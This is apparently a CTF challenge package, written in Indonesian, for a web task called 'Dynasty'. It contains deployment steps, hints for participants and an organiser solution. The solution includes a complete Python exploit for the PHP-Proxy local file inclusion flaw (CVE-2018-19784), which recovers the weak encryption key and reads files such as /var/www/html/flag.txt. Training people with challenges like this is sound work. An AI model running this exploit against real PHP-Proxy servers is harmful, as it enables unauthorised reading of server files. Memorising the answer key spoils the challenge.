# Dynasty

Difficulty: Medium
Status: Not started
Tags: Web

# Web_Dynasty_Medium

Author: Ismail Hakim - twang#7040

A web blackbox CTF challenge.

Descriptions: Hi guys, kita sedang mengembangkan aplikasi tracking silsilah keluarga crazy rich kita dengan cara mengintegrasikan ke Google search.

# Untuk Panitia

Flag: FindITCTF{flag}

Deployment steps:

```bash
sudo apt install docker-compose

cd web_dynasty/service
docker-compose up

# Untuk mematikan
CTRL - C
docker-compose down
```

Solving steps:

1. Directory bruteforcing dengan wordlist pada common.txt
2. Memahami cara kerja dari proxy. Dan melakukan information gathering berkaitan dengan proxy php : PHP-Proxy (LFI vulnerability)
3. PHP-Proxy memiliki vulnerability Local File Inclusion akibat enkripsi yang kurang baik. Hal ini dapat dilakukan apabila kita mengetahui plain text dan cipher text (CVE-2018-19784)
4. PoC based on [https://github.com/Athlon1600/php-proxy-app/issues/135](https://github.com/Athlon1600/php-proxy-app/issues/135)

```python
import requests
import base64

def encrypt(plaintext, key):
    key_length = len(key)
    key_as_int = [ord(i) for i in key]
    plaintext_int = [ord(i) for i in plaintext]
    ciphertext = []
    for i in range(len(plaintext_int)):
        value = (plaintext_int[i] + key_as_int[i % key_length]) % 256
        ciphertext.append(value)
    return bytes(ciphertext)

def calculate_key(ciphertext, plaintext):
    key = []
    for i in range(0, len(ciphertext)):
        if ciphertext[i] - ord(plaintext[i]) < 0:
            key.append(chr(ciphertext[i] - ord(plaintext[i]) + 256))
        else:
            key.append(chr(ciphertext[i] - ord(plaintext[i])))

    return "".join(key[:32])

def exploit(url, file_to_read):
    r = requests.post(url + '/index.php', data={'url': 'http://aaaaaaaaaaaaaaaaaaaaaaaaaaa.com'}, allow_redirects=False)

    b64_url_ciphertext = r.headers['location'].split('?q=')[1]
    b64_url_ciphertext = b64_url_ciphertext + "=" * (len(b64_url_ciphertext) % 4)
    url_ciphertext = base64.b64decode(b64_url_ciphertext)
    url_plaintext = 'http://aaaaaaaaaaaaaaaaaaaaaaaaaaa.com'

    key = calculate_key(url_ciphertext, url_plaintext)
    return requests.get(url + '/index.php', params={'q': base64.b64encode(encrypt(file_to_read, key))}).text

print(exploit('http://localhost:1337/app', 'file:///var/www/html/flag.txt'))
```

# Untuk Peserta

Web_Dynasty_Medium

**Author**: Ismail Hakim - twang#7040

**Descriptions**: Hi guys, kita sedang mengembangkan aplikasi tracking silsilah keluarga crazy rich dengan cara mengintegrasikan ke Google search engine. To-do: cek keamanan proxy pada server php kita. Mungkin ada versi yang lebih baru dari versi 5.1.0.

**Hint**: flag ada di /var/www/html